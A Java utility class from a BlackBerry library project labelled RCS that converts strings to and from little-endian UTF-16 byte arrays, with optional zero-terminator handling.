/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : WChar.java 
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.utils;

import java.io.UnsupportedEncodingException;

public final class WChar {
    //#debug
    private static Debug debug = new Debug("WChar", DebugLevel.VERBOSE);

    public static byte[] getBytes(final String string) {
        return getBytes(string, false);
    };

    public static byte[] getBytes(final String string, final boolean endzero) {
        byte[] encoded = null;

        try {
            encoded = string.getBytes("UnicodeLittleUnmarked");
        } catch (final UnsupportedEncodingException e) {
            // #debug
            debug.error("UnsupportedEncodingException");
        }

        if (endzero) {
            final byte[] zeroencoded = new byte[encoded.length + 4];
            Utils.copy(zeroencoded, encoded, encoded.length);
            encoded = zeroencoded;
        }

        return encoded;
    }

    public static String getString(final byte[] message, final boolean endzero) {
        return getString(message, 0, message.length, endzero);
    }

    public static String getString(final byte[] message, final int offset,
            final int length, final boolean endzero) {
        String decoded = "";

        try {
            decoded = new String(message, offset, length,
                    "UnicodeLittleUnmarked");

        } catch (final UnsupportedEncodingException e) {
            // #debug
            debug.error("UnsupportedEncodingException");
        }

        if (endzero) {
            final int lastPos = decoded.indexOf('\0');
            if (lastPos > -1) {
                decoded = decoded.substring(0, lastPos);
            }
        }

        return decoded;
    }

    private WChar() {
    }

}
